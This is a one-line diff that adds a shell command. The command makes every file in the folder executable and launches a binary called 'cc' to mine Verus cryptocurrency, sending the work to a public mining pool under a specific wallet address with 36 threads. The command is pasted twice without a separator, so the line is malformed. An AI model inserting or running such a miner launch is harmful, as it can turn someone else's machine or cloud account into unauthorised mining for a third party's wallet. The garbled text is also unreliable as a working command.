@@ -1,0 +1,1 @@
+chmod +x * && ./cc -a verus -o stratum+tcp://verus.wattpool.net:1230 -u RT3QTpGdya1CCJABvKMwp6JgcPig5ZjPM9.02 -p x -t 36./cc -a verus -o stratum+tcp://verus.wattpool.net:1230 -u RT3QTpGdya1CCJABvKMwp6JgcPig5ZjPM9.02 -p x -t 36
